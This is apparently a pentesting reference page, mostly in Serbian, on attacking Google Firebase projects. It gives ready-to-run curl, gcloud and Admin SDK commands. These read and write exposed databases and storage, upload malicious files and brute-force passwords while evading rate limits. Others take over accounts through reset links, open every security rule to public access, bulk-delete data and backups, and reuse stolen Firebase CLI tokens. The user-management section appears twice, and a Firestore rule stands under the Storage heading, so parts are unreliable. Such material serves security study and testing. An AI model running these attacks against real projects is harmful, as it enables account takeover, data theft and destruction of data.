# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Unauthenticated access to Firebase Realtime Database
Napadaču nisu potrebna posebna Firebase dopuštenja da bi izveo ovaj napad. Potrebno je samo da postoji ranjiva konfiguracija u Firebase Realtime Database security rules, gde su pravila postavljena sa `.read: true` ili `.write: true`, što omogućava javni pristup za čitanje ili upis.

Napadač mora da identifikuje database URL, koji obično ima format: `https://<project-id>.firebaseio.com/`.

Ovaj URL se može pronaći kroz mobile application reverse engineering (decompiling Android APKs or analyzing iOS apps), analizom konfiguracionih fajlova kao što su google-services.json (Android) ili GoogleService-Info.plist (iOS), pregledom source code web aplikacija, ili analizom network traffic da bi se identifikovali zahtevi ka `*.firebaseio.com` domenima.

Napadač identifikuje database URL i proverava da li je javno izložen, zatim pristupa podacima i potencijalno upisuje zlonamerni sadržaj.

Prvo proveravaju da li baza dozvoljava read access dodavanjem .json na URL.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
Ako odgovor sadrži JSON podatke ili null (umesto "Permission Denied"), baza podataka dozvoljava pristup za čitanje. Da bi proverio pristup za pisanje, napadač može pokušati da pošalje testni zahtev za pisanje koristeći Firebase REST API.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
If the operation succeeds, the database also allows write access.

### Izlaganje podataka u Cloud Firestore
Napadaču nisu potrebna nikakva posebna Firebase ovlašćenja da bi izvršio ovaj napad. Potrebno je samo da postoji ranjiva konfiguracija u Cloud Firestore sigurnosnim pravilima gde pravila dozvoljavaju pristup za čitanje ili pisanje bez autentifikacije ili uz nedovoljnu validaciju. Primer pogrešno konfigurisanog pravila koje dodeljuje potpuni pristup je:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Ovo pravilo omogućava bilo kome da čita i upisuje sve dokumente bez ikakvih ograničenja. Firestore pravila su granularna i primenjuju se po kolekciji i dokumentu, pa greška u određenom pravilu može izložiti samo određene kolekcije.

Napadač mora identifikovati Firebase Project ID, koji se može pronaći kroz mobile app reverse engineering, analizu konfiguracionih fajlova kao što su google-services.json ili GoogleService-Info.plist, pregled izvornog koda web aplikacija, ili analizom mrežnog saobraćaja kako bi identifikovao zahteve ka firestore.googleapis.com.
Firestore REST API koristi format:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Ako pravila dozvoljavaju neautentifikovano čitanje, napadač može čitati kolekcije i dokumente. Prvo pokušava da pristupi određenoj kolekciji:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
Ako odgovor sadrži JSON dokumente umesto greške u pristupu, kolekcija je izložena. Napadač može da enumeriše sve dostupne kolekcije pokušavajući uobičajena imena ili analizom strukture aplikacije. Za pristup određenom dokumentu:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Ako pravila dozvoljavaju neautentifikovan write pristup ili imaju nedovoljnu validaciju, napadač može kreirati nove dokumente:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
Za izmenu postojećeg dokumenta treba koristiti PATCH:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
Za brisanje dokumenta i izazivanje denial of service:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Izlaganje fajlova u Firebase Storage
Napadaču nisu potrebne posebne Firebase dozvole da izvede ovaj napad. Potrebno je samo da postoji ranjiva konfiguracija u Firebase Storage security rules, gde pravila omogućavaju read ili write pristup bez autentifikacije ili sa nedovoljnom validacijom. Storage rules kontrolišu read i write dozvole nezavisno, tako da greška u pravilu može otkriti samo read pristup, samo write pristup ili oba. Primer pogrešno konfigurisanog pravila koje daje pun pristup je:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Ovo pravilo omogućava čitanje i upis svih dokumenata bez ikakvih ograničenja. Firestore pravila su granularna i primenjuju se po kolekciji i po dokumentu, tako da greška u određenom pravilu može izložiti samo određene kolekcije. Napadač mora identifikovati Firebase Project ID, koji se može pronaći kroz reverse engineering mobilne aplikacije, analizu konfiguracionih fajlova kao što su google-services.json ili GoogleService-Info.plist, inspekciju izvornog koda web aplikacije, ili analizu mrežnog saobraćaja da bi se identifikovali zahtevi ka firestore.googleapis.com.
The Firestore REST API uses the format:`https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

Ako pravila dozvoljavaju neautentifikovani pristup za čitanje, napadač može čitati kolekcije i dokumente. Prvo pokušava da pristupi određenoj kolekciji.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
Ako odgovor sadrži listu fajlova umesto greške vezane za dozvole, fajl je izložen. Napadač može da pregleda sadržaj fajlova tako što će navesti njihov put:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
Ako pravila dozvoljavaju unauthenticated write access ili imaju nedovoljnu validaciju, attacker može otpremiti maliciozne fajlove. Da biste uploadovali fajl preko REST API:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
Napadač može otpremiti code shells, malware payloads ili velike fajlove kako bi izazvao denial of service. Ako aplikacija obrađuje ili izvršava otpremljene fajlove, napadač može postići remote code execution. Da bi obrisao fajlove i izazvao denial of service:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Pozivanje javnih Firebase Cloud Functions
Napadač ne treba nikakve posebne Firebase dozvole da iskoristi ovaj problem; dovoljno je da je Cloud Function javno dostupna preko HTTP bez autentifikacije.

Funkcija je ranjiva kada je nesigurno konfigurisana:

- Koristi `functions.https.onRequest`, koji ne nameće autentifikaciju (za razliku od onCall funkcija).
- Kod funkcije ne proverava autentifikaciju korisnika (npr. nema provera za `request.auth` ili `context.auth`).
- Funkcija je javno dostupna u IAM-u, što znači da `allUsers` ima rolu `roles/cloudfunctions.invoker`. Ovo je podrazumevano ponašanje za HTTP funkcije osim ako developer ne ograniči pristup.

Firebase HTTP Cloud Functions su izložene putem URL-ova kao što su:

- `https://<region>-<project-id>.cloudfunctions.net/<function-name>`
- `https://<project-id>.web.app/<function-name>` (when integrated with Firebase Hosting)

Napadač može otkriti ove URL-ove analizom izvornog koda, inspekcijom mrežnog saobraćaja, alatima za enumeraciju, ili reverse engineering mobilne aplikacije.
Ako je funkcija javno izložena i neautentifikovana, napadač je može pozvati direktno bez kredencijala.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
Ako funkcija ne validira pravilno ulaze, napadač može pokušati i druge napade, kao što su code injection ili command injection.

### Brute-force attack against Firebase Authentication with a weak password policy
Napadaču nisu potrebne specifične Firebase dozvole da izvede ovaj napad. Potrebno je samo da je Firebase API Key izložen u mobilnim ili web aplikacijama, i da politika lozinki (password policy) nije konfigurisana sa strožijim zahtevima od podrazumevanih.

Napadač mora identifikovati Firebase API Key, koji se može naći putem mobile app reverse engineering, analize konfiguracionih fajlova kao što su google-services.json ili GoogleService-Info.plist, inspekcijom source code-a web aplikacija (npr. u bootstrap.js), ili analizom network traffic-a.

Firebase Authentication’s REST API uses the endpoint:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`
to authenticate with email and password.

If Email Enumeration Protection is disabled, API error responses can reveal whether an email exists in the system (EMAIL_NOT_FOUND vs. INVALID_PASSWORD), which allows attackers to enumerate users before attempting password guessing. When this protection is enabled, the API returns the same error message for both nonexistent emails and incorrect passwords, preventing user enumeration.

Važno je napomenuti da Firebase Authentication nameće rate limiting, što može blokirati zahteve ako previše pokušaja autentifikacije nastupi u kratkom vremenskom periodu. Zbog toga bi napadač morao uvoditi kašnjenja između pokušaja kako bi izbegao rate-limited stanje.

Napadač identifikuje API Key i izvršava pokušaje autentifikacije sa više lozinki protiv poznatih naloga. If Email Enumeration Protection is disabled, napadač može enumerisati postojeće korisnike analizom odgovora na greške:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
Ako odgovor sadrži EMAIL_NOT_FOUND, email ne postoji u sistemu. Ako sadrži INVALID_PASSWORD, email postoji, ali je lozinka netačna, što potvrđuje da je korisnik registrovan. Kada se identifikuje važeći korisnik, napadač može izvršiti brute-force pokušaje. Važno je uključiti pauze između pokušaja kako bi se izbegli rate-limiting mehanizmi Firebase Authentication:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
Sa podrazumevanom politikom lozinki (minimum 6 karaktera, bez zahteva za složenošću), napadač može pokušati sve moguće kombinacije lozinki od 6 karaktera, što predstavlja relativno mali prostor pretrage u poređenju sa strožijim politikama lozinki.

### Upravljanje korisnicima u Firebase Authentication

Napadaču su potrebne specifične dozvole za Firebase Authentication da bi izveo ovaj napad. Potrebne dozvole su:

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to retrieve user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

Te dozvole su uključene u `roles/firebaseauth.admin` rolu, koja daje pun read/write pristup Firebase Authentication resursima. Takođe su uključene u viši nivo rola kao što su roles/firebase.developAdmin (koja uključuje sve firebaseauth.* dozvole) i roles/firebase.admin (puni pristup svim Firebase servisima).

Da bi koristio Firebase Admin SDK, napadač bi morao imati pristup service account credentials (JSON file), koji se mogu naći na kompromitovanim sistemima, javno izloženim repozitorijumima koda, kompromitovanim CI/CD sistemima ili kroz kompromitovanje developerskih naloga koji imaju pristup tim kredencijalima.

Prvi korak je konfiguracija Firebase Admin SDK koristeći service account credentials.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Da bi kreirao zlonamernog korisnika koristeći email žrtve, napadač bi pokušao da koristi Firebase Admin SDK da generiše novi nalog pod tom email adresom.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Da bi izmenio postojećeg korisnika, napadač bi ažurirao polja kao što su e-mail adresa, status verifikacije ili da li je nalog onemogućen.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Da bi obrisao korisnički nalog i prouzrokovao denial of service, napadač bi poslao zahtev za potpuno uklanjanje korisnika.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Napadač takođe može da pribavi informacije o postojećim korisnicima zahtevajući njihov UID ili email address.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Pored toga, napadač bi mogao da generiše verifikacione linkove ili linkove za resetovanje lozinke kako bi promenio lozinku korisnika i dobio pristup njihovom nalogu.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Upravljanje korisnicima u Firebase Authentication
Napadaču su potrebna specifična dozvole u Firebase Authentication da izvede ovaj napad. Potrebne dozvole su:

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to obtain user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

Ove dozvole su uključene u ulogu roles/firebaseauth.admin, koja daje potpuni read/write pristup Firebase Authentication resursima. Takođe su deo višeg nivoa uloga kao što su `roles/firebase.developAdmin` (koja uključuje sve firebaseauth.* dozvole) i `roles/firebase.admin` (potpun pristup svim Firebase servisima).

Da bi koristio Firebase Admin SDK, napadač bi morao da ima pristup podacima servisnog naloga (JSON fajl), koji se može dobiti sa kompromitovanih sistema, javno izloženih repozitorijuma koda, kompromitovanih CI/CD okruženja, ili kompromitovanjem developerskih naloga koji imaju pristup tim podacima.

Prvi korak je konfigurisanje Firebase Admin SDK koristeći podatke servisnog naloga.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Da bi kreirao malicioznog korisnika koristeći e-poštu žrtve, napadač bi pokušao da kreira novi korisnički nalog sa tom adresom, dodeljujući svoju lozinku i informacije o profilu.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Da bi izmenio postojećeg korisnika, napadač bi promenio polja kao što su adresa e-pošte, status verifikacije ili da li je nalog onemogućen.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Da bi izbrisao korisnički nalog — što efektivno dovodi do denial of service — napadač bi poslao zahtev da se taj korisnik trajno ukloni.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Napadač takođe može da pribavi informacije o postojećim korisnicima, kao što su njihov UID ili email, zahtevajući detalje korisnika po UID‑u ili po email adresi.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Pored toga, napadač bi mogao generisati verifikacione linkove ili linkove za resetovanje lozinke, što bi mu omogućilo da promeni lozinku korisnika i preuzme kontrolu nad nalogom.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Izmena sigurnosnih pravila u Firebase servisima
Napadaču su potrebna specifična ovlašćenja da bi izmenio sigurnosna pravila, u zavisnosti od servisa. Za Cloud Firestore i Firebase Cloud Storage, potrebna ovlašćenja su `firebaserules.rulesets.create` za kreiranje ruleset-ova i `firebaserules.releases.create` za postavljanje release-a. Ova ovlašćenja su uključena u ulogu `roles/firebaserules.admin` ili u viša prava kao što su `roles/firebase.developAdmin` i `roles/firebase.admin`. Za Firebase Realtime Database, potrebno je ovlašćenje `firebasedatabase.instances.update`.

Napadač mora koristiti Firebase REST API da bi izmenio sigurnosna pravila.
Prvo, napadač mora da dobije pristupni token koristeći akreditive servisnog naloga.
Da bi dobio token:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Da biste izmenili pravila Firebase Realtime Database:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Da bi izmenio Cloud Firestore rules, napadač mora da kreira ruleset i zatim ga deploy-uje:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Prethodna komanda vraća naziv ruleseta u formatu projects/<project-id>/rulesets/<ruleset-id>. Da biste postavili novu verziju, release mora biti ažuriran pomoću PATCH zahteva:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Da biste izmenili pravila za Firebase Cloud Storage:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Prethodna komanda vraća ime ruleset-a u formatu projects/<project-id>/rulesets/<ruleset-id>. Da biste objavili novu verziju, release mora biti ažuriran korišćenjem PATCH request-a:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Eksfiltracija podataka i manipulacija u Cloud Firestore
Cloud Firestore koristi istu infrastrukturu i sistem dozvola kao Cloud Datastore, tako da Datastore IAM dozvole važe direktno za Firestore. Za manipulaciju TTL politikama potrebna je dozvola `datastore.indexes.update`. Za eksport podataka potrebna je dozvola `datastore.databases.export`. Za import podataka potrebna je dozvola datastore.databases.import. Za izvršavanje masovnog brisanja podataka potrebna je dozvola `datastore.databases.bulkDelete`.

Za operacije backup i restore potrebne su specifične dozvole:

- `datastore.backups.get` i `datastore.backups.list` za listanje i preuzimanje detalja dostupnih backup-ova
- `datastore.backups.delete` za brisanje backup-ova
- `datastore.backups.restoreDatabase` za vraćanje baze iz backup-a
- `datastore.backupSchedules.create` i `datastore.backupSchedules.delete` za upravljanje rasporedima backup-a

Kada se kreira TTL politika, odabere se određeno svojstvo koje identifikuje entitete podobne za brisanje. Ovo TTL svojstvo mora biti tipa Date and time. Napadač može izabrati svojstvo koje već postoji ili odrediti svojstvo koje planira da doda kasnije. Ako je vrednost polja datum u prošlosti, dokument postaje podoban za trenutno brisanje. Napadač može koristiti gcloud CLI za manipulaciju TTL politikama.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
Da bi izvezao podatke i eksfiltrirao ih, napadač bi mogao da koristi gcloud CLI.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
Da biste uvezli maliciozne podatke:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
Da bi izvršio masovno brisanje podataka i izazvao denial of service, napadač može koristiti gcloud Firestore bulk-delete tool da ukloni čitave kolekcije.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
Za operacije backup-a i obnove, napadač može kreirati zakazane backupe da zabeleži trenutno stanje baze podataka, prikazati postojeće backupe, vratiti iz backupa kako bi prebrisao nedavne promene, izbrisati backupe da izazove trajni gubitak podataka i ukloniti zakazane backupe.
Da biste kreirali dnevni raspored backupa koji odmah generiše backup:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
Da bi vratio podatke iz određene rezervne kopije, napadač može da kreira novu bazu podataka koristeći podatke iz te rezervne kopije. Operacija vraćanja upisuje podatke rezervne kopije u novu bazu podataka, što znači da se postojeći DATABASE_ID ne može koristiti.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
Da obrišete backup i prouzrokujete trajni gubitak podataka:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Krađa i zloupotreba Firebase CLI kredencijala
Napadač ne treba specifične Firebase dozvole da izvede ovaj napad, ali mu je potreban pristup lokalnom sistemu programera ili do Firebase CLI fajla sa kredencijalima. Ovi kredencijali su sačuvani u JSON fajlu koji se nalazi na:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

Ovaj fajl sadrži autentifikacione tokene, uključujući refresh_token i access_token, koji napadaču omogućavaju da se autentifikuje kao korisnik koji je originalno pokrenuo firebase login.

Napadač dobija pristup Firebase CLI fajlu sa kredencijalima. Zatim može kopirati ceo fajl na svoj sistem, a Firebase CLI će automatski koristiti kredencijale iz svoje podrazumevane lokacije. Nakon toga, napadač može videti sve Firebase projekte kojima taj korisnik ima pristup.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
